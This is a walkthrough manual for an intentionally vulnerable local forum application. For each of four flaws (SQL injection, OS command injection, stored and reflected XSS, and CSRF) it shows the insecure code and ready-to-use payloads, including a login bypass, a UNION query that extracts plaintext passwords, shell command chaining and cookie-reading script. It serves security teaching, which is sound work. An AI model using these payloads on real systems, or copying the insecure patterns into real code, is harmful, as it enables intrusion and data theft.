# Vulnerable Application Exploitation Manual:

## 1. Overview of Insecure Implementations in Version 1:
1. Version 1 of the IIIT Allahabad Open Source Community Forum is intentionally configured with security flaws across four distinct vulnerability classes.
2. The application runs locally on port 3000 and is served by an Express backend utilizing an embedded SQLite database.
3. This manual details the exact code locations, root cause mechanics, and reproduction steps for executing working exploits against each vulnerability variant.

## 2. Category 1: SQL Injection Vulnerabilities:

### 2.1 Code Flaws in Authentication and Discussion Search:
1. Authentication Login Flaw: Located in `IIITAOSCommunityForumV1/server/routes/auth.js` within the `POST /api/auth/login` handler.
2. Insecure Code Snippet.
```javascript
const rawQuery = "SELECT id, username, password, full_name, role, bio FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
const user = db.prepare(rawQuery).get();
```
3. Mechanism: The input values are interpolated directly into SQL syntax without token binding or sanitization.
4. Discussion Search Flaw: Located in `IIITAOSCommunityForumV1/server/routes/posts.js` within the `GET /api/posts/search` handler.
5. Insecure Code Snippet.
```javascript
const rawQuery = "SELECT id, title, category, content FROM posts WHERE title LIKE '%" + q + "%' OR content LIKE '%" + q + "%'";
const posts = db.prepare(rawQuery).all();
```

### 2.2 Exploitation Walkthroughs:
1. Variant 1 Authentication Bypass:
   Open `http://localhost:3000` in the browser and open the Account Login dialog.
   In the Username field, enter `mridankan' --`.
   In the Password field, enter any arbitrary string such as `wrongpassword`.
   Submit the form.
   Result: The database executes `SELECT id, username, password, full_name, role, bio FROM users WHERE username = 'mridankan' --' AND password = '...'`. The trailing password check is ignored as an SQL comment, logging the user in as Administrator Mridankan Mandal.
2. Variant 2 UNION Based Data Extraction:
   On `http://localhost:3000`, click Discussions.
   In the search bar, enter `' UNION SELECT id, username, password, bio FROM users --`.
   Click Search.
   Result: The database query returns both discussion records and all records from the `users` table, displaying usernames and plaintext passwords directly in the discussion feed.

## 3. Category 2: OS Command Injection Vulnerabilities:

### 3.1 Code Flaws in System Diagnostics:
1. In Band Command Execution Flaw: Located in `IIITAOSCommunityForumV1/server/routes/diagnostics.js` within the `POST /api/diagnostics/ping` route.
2. Insecure Code Snippet.
```javascript
const host = req.body.host || '127.0.0.1';
const command = process.platform === 'win32' ? 'ping -n 2 ' + host : 'ping -c 2 ' + host;
exec(command, (error, stdout, stderr) => {
  return res.json({ output: stdout || stderr || error?.message });
});
```
3. Mechanism: The host parameter is concatenated into an operating system shell command and executed using `child_process.exec`.
4. Blind Time Based Injection Flaw: Located in `POST /api/diagnostics/archive` where input is concatenated into a background command.
5. Insecure Code Snippet.
```javascript
const target = req.body.target || 'telemetry';
const command = 'echo archiver ' + target;
exec(command, () => { res.json({ status: 'Scheduled' }); });
```

### 3.2 Exploitation Walkthroughs:
1. Variant 1 In Band Command Output Returned:
   Open `http://localhost:3000` and click the Diagnostics tab.
   In the Campus Server Diagnostics card, enter the host payload `127.0.0.1 & whoami`.
   Click Execute Node Ping.
   Result: The shell executes `ping -n 2 127.0.0.1` followed by `whoami`, returning the current system user name in the console output box.
2. Variant 2 Blind Time Based Injection:
   Under the Diagnostics tab, locate the Background System Diagnostics Archiver card.
   In the Target Identifier input, enter `telemetry & ping -n 6 127.0.0.1`.
   Click Schedule Diagnostics Task.
   Result: The server pauses execution for over five seconds while waiting for the ping delay to complete before sending the HTTP response, confirming blind arbitrary execution.

## 4. Category 3: Cross Site Scripting (XSS) Vulnerabilities:

### 4.1 Code Flaws in DOM Rendering and Query Reflection:
1. Content Rendering Flaw: Located in `IIITAOSCommunityForumV1/client/src/components/ContentRenderer.jsx`.
2. Insecure Code Snippet.
```javascript
containerRef.current.innerHTML = content;
const scripts = containerRef.current.querySelectorAll('script');
scripts.forEach((oldScript) => {
  const newScript = document.createElement('script');
  Array.from(oldScript.attributes).forEach((attr) => newScript.setAttribute(attr.name, attr.value));
  newScript.appendChild(document.createTextNode(oldScript.innerHTML));
  oldScript.parentNode.replaceChild(newScript, oldScript);
});
```
3. Mechanism: Untrusted HTML is directly inserted into the DOM without sanitization, and `<script>` elements are dynamically evaluated.
4. Reflected Query Flaw: In `ForumView.jsx`, search queries are reflected directly into the page through `ContentRenderer`.

### 4.2 Exploitation Walkthroughs:
1. Variant 1 Stored XSS:
   On `http://localhost:3000`, click Start Discussion.
   Set Title to `Campus Security Update`.
   Set Content to `<img src="invalid" onerror="alert('Stored XSS Executed on Session: ' + document.cookie)" />`.
   Publish the discussion.
   Result: The payload is stored in the database. Whenever any visitor opens the discussion topic, the image error event triggers and displays the active session cookie in an alert dialog.
2. Variant 2 Reflected XSS:
   On `http://localhost:3000`, enter `<img src="x" onerror="alert('Reflected XSS Execution')">` in the discussion search field.
   Click Search.
   Result: The reflected search notice renders the image tag into the DOM, executing the script immediately.

## 5. Category 4: Cross Site Request Forgery (CSRF) Vulnerabilities:

### 5.1 Code Flaws in Authentication and Discussion Routes:
1. Profile Modification Flaw: Located in `IIITAOSCommunityForumV1/server/routes/auth.js` within `POST /api/auth/profile`.
2. Insecure Code Snippet.
```javascript
const handleProfileUpdate = (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Authentication required.' });
  db.prepare('UPDATE users SET full_name = ?, bio = ? WHERE id = ?').run(fullName, bio, req.user.id);
  return res.json({ message: 'Profile updated successfully' });
};
router.post('/profile', authenticate, handleProfileUpdate);
```
3. Cookie Configuration Flaw: Session cookies are issued without `SameSite: strict` directives.
4. Discussion Deletion via GET Flaw: In `server/routes/posts.js`, the endpoint `GET /api/posts/delete-by-get` executes deletions on GET requests.

### 5.2 Exploitation Walkthroughs:
1. Variant 1 GET Based Forged Action:
   Log in as Administrator Mridankan Mandal on `http://localhost:3000`.
   In another browser tab, open the external attacker page `http://localhost:3000/attackerCsrfGetExploit.html`.
   Result: An embedded `<img src="http://localhost:3000/api/posts/delete-by-get?id=3" />` fires with ambient cookies, deleting discussion topic 3 without victim knowledge.
2. Variant 2 POST Based Forged Action:
   Keep the authenticated administrator session open on `http://localhost:3000`.
   In a separate tab, open `http://localhost:3000/attackerCsrfExploit.html`.
   Result: An auto submitting hidden HTML form posts forged profile fields to `/api/auth/profile`. Returning to the forum reveals that the administrator biography was completely hijacked.
